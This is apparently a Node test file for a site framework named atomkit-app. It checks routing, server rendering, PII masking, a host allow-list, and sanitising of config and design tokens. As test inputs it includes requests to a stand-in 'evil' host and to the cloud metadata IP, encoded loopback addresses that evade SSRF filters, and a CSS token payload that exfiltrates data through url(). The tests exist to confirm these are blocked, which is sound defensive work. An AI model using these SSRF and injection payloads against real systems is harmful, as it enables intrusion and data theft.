import assert from 'node:assert/strict';
import { mkdtempSync, existsSync, readFileSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  collectRoutes,
  matchRoute,
  renderAqlSource,
  pageShell,
  loadConfig,
  build,
  create,
  isPrivateHost,
  renderContext,
} from '../dist/index.js';

const json = (obj) => new Response(JSON.stringify(obj), { headers: { 'content-type': 'application/json' } });
// A recording fetch stub. `handler(url)` returns a Response or throws (→ network error).
function stub(handler) {
  const calls = [];
  const fn = async (url) => {
    calls.push(String(url));
    return handler(String(url));
  };
  fn.calls = calls;
  return fn;
}

const tmp = mkdtempSync(join(tmpdir(), 'atomkit-app-'));
try {
  // --- create: scaffolds a runnable project (now 3 pages) ---
  create(tmp, 'demo');
  const proj = join(tmp, 'demo');
  for (const f of ['app/index.aql', 'app/about.aql', 'app/data.aql', 'atomkit.config.json']) {
    assert.ok(existsSync(join(proj, f)), `scaffold writes ${f}`);
  }
  const pkg = JSON.parse(readFileSync(join(proj, 'package.json'), 'utf8'));
  assert.ok(pkg.devDependencies['@noidmejs/atomkit-app'], 'atomkit-app pinned as devDependency');
  const scaffoldCfg = JSON.parse(readFileSync(join(proj, 'atomkit.config.json'), 'utf8'));
  assert.deepEqual(scaffoldCfg.data.allowHosts, ['jsonplaceholder.typicode.com'], 'scaffold allow-lists the demo host');

  // --- routing ---
  const routes = collectRoutes(join(proj, 'app'));
  assert.deepEqual(routes.map((r) => r.route).sort(), ['/', '/about', '/data'], 'three routes');
  assert.ok(matchRoute(routes, '/data/'), 'trailing slash matches');
  assert.ok(!matchRoute(routes, '/missing'), 'unknown path → undefined');

  // --- SSR render + HTML shell (static page, no bindings) ---
  const cfg = loadConfig(proj);
  const home = await renderAqlSource(readFileSync(join(proj, 'app/index.aql'), 'utf8'), cfg);
  assert.equal(home.title, 'Home', 'page title from AQL');
  assert.ok(home.html.includes('Ship UI by writing AQL'), 'renders heading text');
  const shell = pageShell({ title: home.title, description: home.description, bodyHtml: home.html, cfg });
  assert.ok(shell.startsWith('<!doctype html>') && shell.includes('--brand:#005DAB'), 'shell + tokens');

  // --- governance: a PII node never reaches the served HTML ---
  const pii = await renderAqlSource('page "P" {\n  text "secret@corp.com" pii\n}', cfg);
  assert.ok(!pii.html.includes('secret@corp.com'), 'PII value masked in SSR output');

  // helper: a cfg with specific allowHosts
  const withHosts = (hosts) => ({ ...cfg, data: { ...cfg.data, allowHosts: hosts } });

  // === DATA BINDING ===

  // (1) resolved value is baked; PII-flagged bound node is masked AND never fetched.
  {
    const f = stub(() => json({ name: 'Ada Lovelace', company: { name: 'Analytical Engines' }, email: 'ada@corp.example' }));
    const page = await renderAqlSource(readFileSync(join(proj, 'app/data.aql'), 'utf8'), cfg, { fetchImpl: f });
    assert.ok(page.html.includes('Ada Lovelace'), 'name resolved + baked into HTML');
    assert.ok(page.html.includes('Analytical Engines'), 'nested path company.name resolved');
    assert.ok(!page.html.includes('ada@corp.example'), 'pii-bound email is NEVER fetched/rendered');
    assert.ok(page.html.includes('•••••'), 'pii node renders masked');
    assert.ok(f.calls.every((u) => u.startsWith('https://jsonplaceholder.typicode.com/')), 'only the allow-listed host is hit');
    assert.ok(f.calls.length >= 1 && f.calls.length <= 2, 'email path was not fetched (2 non-pii bindings, deduped by path)');
  }

  // (2) off-allow-list host → fallback, and NEVER fetched.
  {
    const f = stub(() => json({ v: 'LEAK' }));
    const doc = 'page "X" {\n  text "fallback-A" api="https://evil.example/x" path=v bind=text\n}';
    const page = await renderAqlSource(doc, withHosts(['jsonplaceholder.typicode.com']), { fetchImpl: f });
    assert.ok(page.html.includes('fallback-A') && !page.html.includes('LEAK'), 'off-list host → authored fallback');
    assert.equal(f.calls.length, 0, 'off-list host is never fetched');
    assert.ok(page.notes.some((n) => n.includes('host not allowed')), 'drop is noted');
  }

  // (3) allow-listed but unreachable host → fallback (fail-closed on error).
  {
    const f = stub(() => { throw new Error('ENOTFOUND api.test'); });
    const doc = 'page "X" {\n  text "fallback-B" api="https://api.test/x" path=v bind=text\n}';
    const page = await renderAqlSource(doc, withHosts(['api.test']), { fetchImpl: f });
    assert.ok(page.html.includes('fallback-B'), 'unreachable host → authored fallback');
    assert.ok(f.calls.length === 1, 'it did attempt the allow-listed host');
    assert.ok(page.notes.some((n) => n.includes('fetch failed')), 'failure is noted');
  }

  // (4) private/reserved IP literal → blocked BEFORE fetch even if allow-listed.
  {
    const f = stub(() => json({ v: 'METADATA' }));
    const doc = 'page "X" {\n  text "fallback-C" api="http://169.254.169.254/latest/meta-data/" path=v bind=text\n}';
    const page = await renderAqlSource(doc, withHosts(['169.254.169.254']), { fetchImpl: f });
    assert.ok(page.html.includes('fallback-C') && !page.html.includes('METADATA'), 'metadata IP → fallback');
    assert.equal(f.calls.length, 0, 'private IP is never fetched (pre-flight deny)');
    assert.ok(page.notes.some((n) => n.includes('private/reserved')), 'private-host drop is noted');
  }

  // (5) empty-string result → authored fallback survives (never baked blank).
  {
    const f = stub(() => json({ name: '   ' })); // whitespace-only
    const doc = 'page "X" {\n  text "Loading name" api="https://api.test/u" path=name bind=text\n}';
    const page = await renderAqlSource(doc, withHosts(['api.test']), { fetchImpl: f });
    assert.ok(page.html.includes('Loading name'), 'empty/whitespace result keeps the authored fallback');
    assert.ok(page.notes.some((n) => n.includes('empty result')), 'empty result is noted');
  }

  // (6) unit: isPrivateHost classification (incl. encoded IPv4 + hex IPv4-mapped IPv6).
  for (const h of [
    'localhost', '127.0.0.1', '127.0.0.1.', '169.254.169.254', '10.1.2.3', '192.168.0.1', '172.16.0.1',
    '::1', 'fe80::1', 'fd00::1', '::ffff:127.0.0.1', '::ffff:7f00:1', '2130706433', '0x7f000001', '0177.0.0.1',
  ])
    assert.ok(isPrivateHost(h), `${h} is private`);
  for (const h of ['jsonplaceholder.typicode.com', '8.8.8.8', 'api.github.com', '1.1.1.1', '133.7.0.1'])
    assert.ok(!isPrivateHost(h), `${h} is public`);

  // --- build: static HTML (data baked, hermetic via stub) + standalone React ---
  const bf = stub(() => json({ name: 'Ada Lovelace', company: { name: 'Analytical Engines' }, email: 'ada@corp.example' }));
  await build(proj, { fetchImpl: bf });
  for (const f of ['dist/index.html', 'dist/about/index.html', 'dist/data/index.html', 'dist/components/Home.tsx', 'dist/components/Data.tsx', 'dist/robots.txt'])
    assert.ok(existsSync(join(proj, f)), `build emits ${f}`);
  const dataHtml = readFileSync(join(proj, 'dist/data/index.html'), 'utf8');
  assert.ok(dataHtml.includes('Ada Lovelace') && !dataHtml.includes('ada@corp.example'), 'built /data bakes data, masks pii');
  const homeTsx = readFileSync(join(proj, 'dist/components/Home.tsx'), 'utf8');
  assert.ok(homeTsx.includes('import * as React') && !homeTsx.includes('@noidmejs/atomkit'), 'compiled component is standalone React');
  const manifest = JSON.parse(readFileSync(join(proj, 'dist/routes.json'), 'utf8'));
  assert.equal(manifest.length, 3, 'routes.json lists three pages');

  // The ejected component must NOT claim to fetch — it renders the fallback.
  const dataTsx = readFileSync(join(proj, 'dist/components/Data.tsx'), 'utf8');
  assert.ok(/does NOT fetch/.test(dataTsx), 'ejected component records that it does not fetch');
  assert.ok(!/fetch\(/.test(dataTsx), 'ejected component contains no fetch call');

  // ── Regressions ───────────────────────────────────────────────────────────
  // Config: a governance flag must never be widened by a typo. `"false"` is a
  // truthy STRING — the most likely JSON mistake — and a `!!` coercion granted
  // PII visibility, permanently baking it into publicly served HTML.
  {
    const bad = mkdtempSync(join(tmpdir(), 'ak-cfg-'));
    const write = (obj) => writeFileSync(join(bad, 'atomkit.config.json'), JSON.stringify(obj));

    write({ context: { canViewPii: 'false' } });
    assert.throws(() => loadConfig(bad), /canViewPii.*must be a boolean/s, 'string "false" is rejected, not coerced');

    write({ context: { canViewProtected: 'true' } });
    assert.throws(() => loadConfig(bad), /canViewProtected/, 'string "true" is rejected too');

    write({ port: '3300' });
    assert.throws(() => loadConfig(bad), /port.*must be a finite number/s, 'string port rejected');

    write({ data: { allowHosts: 'api.example.com' } });
    assert.throws(() => loadConfig(bad), /allowHosts.*array of strings/s, 'non-array allowHosts rejected');

    write({ contxt: {} });
    assert.throws(() => loadConfig(bad), /unknown key "contxt"/, 'typo in a top-level key is caught');

    write({ context: { canViewPii: true } });
    assert.equal(loadConfig(bad).context.canViewPii, true, 'a real boolean still works');

    write({ context: {} });
    const ctx = renderContext(loadConfig(bad));
    assert.equal(ctx.canViewPii, false, 'defaults stay least-privileged');
    assert.equal(ctx.consent.analytics, false, 'analytics consent defaults off');
    rmSync(bad, { recursive: true, force: true });
  }

  // Design tokens are a single CSS value: `;` and `url()` must not survive, or a
  // token becomes a second declaration on :root and exfiltrates on page load.
  {
    const cfg = { ...loadConfig(proj), tokens: { brand: 'red;background:url(https://evil/?leak)', ok: '#0b1220' } };
    const shell = pageShell({ title: 't', bodyHtml: '', cfg, liveReload: false });
    assert.ok(!shell.includes('evil'), 'token cannot inject url() exfiltration');
    assert.ok(!/--brand:/.test(shell), 'hostile token value is dropped entirely');
    assert.ok(shell.includes('--ok:#0b1220'), 'benign token still emitted');
  }

  console.log('✓ atomkit-app tests passed (scaffold, routing, SSR, governance, DATA BINDING [resolve/pii/off-list/unreachable/private-IP], build → HTML + standalone React, strict config validation, token CSS sanitising)');
} finally {
  rmSync(tmp, { recursive: true, force: true });
}
